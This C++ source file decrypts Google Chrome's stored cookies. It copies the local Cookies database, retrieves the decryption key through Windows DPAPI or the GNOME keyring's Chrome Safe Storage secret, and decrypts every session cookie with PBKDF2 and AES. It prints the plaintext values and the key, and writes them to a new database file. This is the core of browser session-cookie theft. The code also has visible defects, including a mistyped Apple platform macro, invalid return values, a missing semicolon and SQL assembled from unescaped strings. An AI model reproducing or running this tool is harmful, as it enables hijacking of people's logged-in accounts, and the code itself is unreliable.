
#include <filesystem>

#include <sqlite3.h>  
#include <tuple>
#include <vector>
#include <list>
#include <string>
#include <iostream> 
#include <memory>

#ifdef _WIN32
#include <Windows.h>
#include <Lmcons.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment (lib, "crypt32")
#define ITERATION     1 
#elif __APPLE_
#define ITERATION     1003 
#elif __unix__
#define ITERATION     1 
#include <libsecret/secret.h>
#include <string>
#include <list>
#endif // _WIN32


#include <openssl/evp.h>
#include <openSSL/aes.h>

#define KEY_LEN      16

static bool quiet = false;

using namespace std;


vector<tuple<string, string, vector<unsigned char>, string>> get_encrypted_cookies_vector(char* db_path) {
    
    sqlite3* DB;
    auto sol_vector = vector<tuple<string, string, vector<unsigned char>, string>>();

    int exit = 0;
    exit = sqlite3_open(db_path, &DB);

    if (exit) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        return sol_vector;
    }
    else
        std::cout << "Opened Database Successfully!" << std::endl;
    
    sqlite3_stmt* statement;

    const char* sql = "SELECT host_key, name, encrypted_value from cookies;";
    auto a = sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0);
    if (sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0) != SQLITE_OK)
    {
        printf("Open database failed\n");
        return sol_vector;
    }

    int result = 0;
    while (true)
    {
        result = sqlite3_step(statement);

        if (result == SQLITE_ROW)
        {
            const char* host_key = (const char*)sqlite3_column_text(statement, 0);

            const char* cookie_name = (const char*)sqlite3_column_text(statement, 1);

            // Get the size of the vector
            int size = sqlite3_column_bytes(statement, 2);
            if (size == 0)
                continue;

            // Get the pointer to data
            unsigned char* p = (unsigned char*)sqlite3_column_blob(statement, 2);

            // Initialize the vector with the data
            vector<unsigned char> encrypted_value(p, p + size);         

#ifndef _WIN32
            string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
            if (signature == "v10" || signature == "v11") {
                encrypted_value.erase(encrypted_value.begin(), encrypted_value.begin() + 3);
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
        }
#else
            sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
#endif // !_WIN32

            

        }
        else
        {
            break;
        }
    }

    sqlite3_finalize(statement);
    sqlite3_close(DB);
    return sol_vector;
}



#ifdef __unix__
std::list<std::string> name_values_;
void Append(GHashTable* attrs_, const std::string& name, const std::string& value) {
    name_values_.push_back(name);
    gpointer name_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    name_values_.push_back(value);
    gpointer value_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    g_hash_table_insert(attrs_, name_str, value_str);
}


SecretValue* ToSingleSecret(GList* secret_items) {
    GList* first = g_list_first(secret_items);
    if (first == nullptr)
        return nullptr;
    if (g_list_next(first) != nullptr) {
        //std::cout << "OSCrypt found more than one encryption keys.";
    }
    SecretItem* secret_item = static_cast<SecretItem*>(first->data);
    SecretValue* secret_value = secret_item_get_secret(secret_item);
    return secret_value;
}
#endif



#ifndef _WIN32
string get_key() {
#ifdef __APPLE_

#elif __unix__
    const SecretSchema kKeystoreSchemaV2 = {
        "chrome_libsecret_os_crypt_password_v2",
        SECRET_SCHEMA_DONT_MATCH_NAME,
        {
            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
        }
    };

    GHashTable* attrs;
    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
        nullptr,   // no deleter for keys
        nullptr);  // no deleter for values
    Append(attrs, "application", "chrome");

    GError* error_ = nullptr;

    GList* results_ = nullptr;
    results_ = secret_service_search_sync(nullptr,  // default secret service
        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
        nullptr,  // no cancellable object
        &error_);

    SecretValue * password_libsecret = ToSingleSecret(results_);
    if (password_libsecret == nullptr) {
        printf("[!] Error accessing gnome keyring. Is the user logged in (check who)?\n");
        return -1;
    }


    std::string key(secret_value_get_text(password_libsecret));

    printf("The Key is %s\n", key.c_str());
    return key;

#endif // DEBUG

    return "";
}


string derive_key(string pwd)
{
    size_t i;
    string ret = "";
    unsigned char* out;
    unsigned char salt_value[] = { 's', 'a', 'l', 't', 'y', 's' , 'a', 'l', 't' };

    out = (unsigned char*)malloc(sizeof(unsigned char) * KEY_LEN);

    printf("pass: %s\n", pwd.c_str());
    printf("ITERATION: %u\n", ITERATION);
    printf("salt: "); for (i = 0; i < sizeof(salt_value); i++) { printf("%02x", salt_value[i]); } printf("\n");

    if (PKCS5_PBKDF2_HMAC_SHA1(pwd.c_str(), pwd.size(), salt_value, sizeof(salt_value), ITERATION, KEY_LEN, out) != 0)
    {
        printf("out: "); for (i = 0; i < KEY_LEN; i++) { printf("%02x", out[i]); } printf("\n");
        ret = string((char*)out, KEY_LEN);
    }
    else
    {
        fprintf(stderr, "PKCS5_PBKDF2_HMAC_SHA1 failed\n");
    }

    free(out);

    return ret;
}

std::string AES_Decrypt_String(std::string const& data, std::string const& key, std::vector<unsigned char> const& iVec)
{
    if (data.empty() || key.empty())
        return data;

    unsigned char decryptionIvec[AES_BLOCK_SIZE];
    std::memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);

    AES_KEY AESkey;
    AES_set_decrypt_key((unsigned const char*)key.c_str(), key.size() * 8, &AESkey);
    unsigned char buffer[AES_BLOCK_SIZE];
    std::string value;

    for (unsigned int i = 0; i < data.size(); i += AES_BLOCK_SIZE)
    {
        AES_cbc_encrypt((unsigned const char*)data.c_str() + i, buffer, AES_BLOCK_SIZE, &AESkey, decryptionIvec, AES_DECRYPT);
        value.resize(value.size() + AES_BLOCK_SIZE);
        std::memcpy(&value[i], buffer, AES_BLOCK_SIZE);
    }

    /* Clean Strip padding from decrypted value.
     Remove number indicated by padding
         e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14. */

    return value.erase(value.size() - (int)value.back());
}
#endif

void decrypt_cookies(vector<tuple<string, string, vector<unsigned char>, string>>* cookie_vector) {
#ifdef _WIN32
    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
        DATA_BLOB input;
        string plaintext;
        input.pbData = const_cast<BYTE*>(
            reinterpret_cast<const BYTE*>(encrypted_value.data()));
        input.cbData = static_cast<DWORD>(encrypted_value.size());

        DATA_BLOB output;
        BOOL result = CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
            0, &output);

        decrypted_value.assign(reinterpret_cast<char*>(output.pbData), output.cbData);
        LocalFree(output.pbData);

        if (!quiet){
            std::cout << "host key " << host_key << " cookie_name  " << cookie_name;
            std::cout << "decrypted_cookie " << decrypted_value << endl;
        }
    }

#else
    // Get key. this is OS dependent
    auto key = get_key();

    // Derive key to get encryption key
    //auto derived_key = derive_key(key);
    auto derived_key = derive_key(key);

    if (derived_key.empty()) {
        // error
        return -1;
    }

    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
        std::cout << "host key " << host_key << " cookie_name  " << cookie_name;

        decrypted_value = AES_Decrypt_String(std::string(encrypted_value.begin(), encrypted_value.end()), derived_key, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));

        std::cout << "decrypted_cookie " << decrypted_value << endl;
    }
#endif // _WIN32
}


int update_decrypted_DB(vector<tuple<string, string, vector<unsigned char>, string>> cookie_vector, char* db_path) {
    sqlite3* DB;
    
    char sql[4000];

    int exit = 0;
    exit = sqlite3_open(db_path, &DB);
    char* zErrMsg = 0;

    if (exit) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        return 1;
    }
    else
        std::cout << "Updating DB rows with decrypted values. This may take a while..." << std::endl;

    /* Create merged SQL statement */
    auto format = "UPDATE cookies SET encrypted_value = '%s' where host_key='%s' AND name='%s'";

    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : cookie_vector) {
        snprintf(sql, sizeof(sql), format, decrypted_value.c_str(), host_key.c_str(), cookie_name.c_str());

        auto rc = sqlite3_exec(DB, sql, NULL, NULL, &zErrMsg);
    }

    return 0;
}


int main(int argc, char** argv) {
    if (argc > 2 && strstr(argv[1], "-q") == 0) {
        quiet = true;
    }

#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
    char cookies_path[MAX_PATH] = {0};
    snprintf(cookies_path, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies", username);
#elif __APPLE_
    auto cookies_path = "~/Library/Application Support/Google/Chrome/Default/Cookies"
#elif __unix__
    auto cookies_path = "~/.config/chromium/Default/Cookies";
#endif // DEBUG

    std::filesystem::copy(cookies_path, "Cookies_decrypted", std::filesystem::copy_options::overwrite_existing);

    auto cookies_vector = get_encrypted_cookies_vector(cookies_path);
    
    if (cookies_vector.empty()) {
    //error
        return -1;
    }

    decrypt_cookies(&cookies_vector);

    // Update Cookies_decrypted with the decrypted values of the cookies
    if (update_decrypted_DB(cookies_vector, "Cookies_decrypted") == 0) {
        cout << "Database has been properly created with decrypted values" << endl;
    }

    
}